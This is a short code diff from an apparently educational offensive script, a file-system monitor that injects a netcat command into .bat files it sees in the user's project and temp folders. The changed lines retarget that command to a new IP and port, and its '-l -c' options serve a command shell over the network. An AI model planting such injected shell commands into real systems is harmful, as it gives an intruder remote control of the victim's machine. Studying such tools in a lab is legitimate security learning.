@@ -14,8 +14,8 @@ FILE_LIST_DIRECTORY = 0x0001
 PATHS = ["c:\\Users\\mtorii\\develop\\ProjectX\\cybersecurity", tempfile.gettempdir()]
 
 NETCAT = "c:\\Users\\mtorii\\develop\\ProjectX\\cybersecurity\\dist\\netcat.exe"
-TGT_IP = "10.0.0.5"
-CMD = f'"""" -t {TGT_IP} -p 9998 -l -c'
+TGT_IP = "10.0.1.5"
+CMD = f'"""" -t {TGT_IP} -p 9999 -l -c'
 
 FILE_TYPES = {
     '.bat': ["\r\nREM bhpmarker\r\n",f'\r\n{CMD}\r\n'],
@@ -84,8 +84,8 @@ def monitor(path_to_watch):
                             print('====================')
                             print('====================')                            
                             print('[^^^] Dump complete.')
-                    except Exception as e:
-                        print(f'[!!!] Dump failed. {e}')
+                        except Exception as e:
+                            print(f'[!!!] Dump failed. {e}')
             
                 elif action == FILE_RENAMED_FROM:
                     print(f'[>] Renamed from {full_filename}')            
